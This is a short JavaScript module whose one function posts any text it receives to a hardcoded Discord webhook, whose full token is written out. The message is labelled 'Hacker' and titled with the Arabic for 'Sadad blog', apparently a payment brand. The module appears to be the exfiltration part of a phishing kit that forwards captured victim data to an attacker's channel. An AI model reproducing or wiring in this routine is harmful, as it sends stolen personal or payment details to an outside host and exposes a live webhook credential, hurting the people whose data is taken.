import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325481867654467717/3bw4SP2viQEx26zuELz32j2ruTvsGj-BBg_PDh4msH71ideOCxdj6OQ8nzgVfzVIyrmP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
